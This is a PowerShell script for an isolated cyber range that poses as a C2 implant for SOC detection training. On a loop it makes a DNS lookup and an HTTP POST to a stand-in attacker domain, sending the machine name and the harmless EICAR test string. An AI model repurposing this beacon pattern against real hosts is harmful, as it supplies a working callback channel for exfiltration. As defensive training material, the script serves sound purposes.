<#
.SYNOPSIS
    SYNTHETIC, BENIGN training beacon for EP-INFECTED. NOT malware.
.DESCRIPTION
    Emits a regular DNS lookup + HTTP POST toward a FAKE malicious domain so the
    SOC has something to detect. The payload is the standard EICAR test string
    (a harmless AV test signature). Nothing malicious is executed, downloaded,
    persisted, or self-replicated. Stop with Ctrl+C.
.NOTES
    Run ONLY inside the isolated range on EP-INFECTED.
#>
[CmdletBinding()]
param(
    [string]$Domain = 'updates.evil-c2.range',
    [int]$IntervalSec = 30,
    [int]$MaxBeacons = 0   # 0 = run until stopped
)

$eicar = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'
Write-Host "[range] BENIGN beacon -> $Domain every $IntervalSec s (Ctrl+C to stop)" -ForegroundColor Yellow
$count = 0
while ($true) {
    $count++
    $ts = (Get-Date).ToString('s')
    try {
        $ans = (Resolve-DnsName -Name $Domain -ErrorAction Stop | Select-Object -First 1).IPAddress
        Write-Host "[$ts] DNS $Domain -> $ans"
        try {
            Invoke-WebRequest "http://$Domain/checkin?id=$env:COMPUTERNAME" -Method POST `
                -Body $eicar -TimeoutSec 5 -UseBasicParsing | Out-Null
            Write-Host "[$ts]   callback POST succeeded (Path B: reached attacker)" -ForegroundColor Red
        } catch {
            Write-Host "[$ts]   callback FAILED/blocked (Path A: contained)" -ForegroundColor Green
        }
    } catch {
        Write-Host "[$ts] DNS resolution failed for $Domain" -ForegroundColor DarkGray
    }
    if ($MaxBeacons -gt 0 -and $count -ge $MaxBeacons) { break }
    Start-Sleep -Seconds $IntervalSec
}
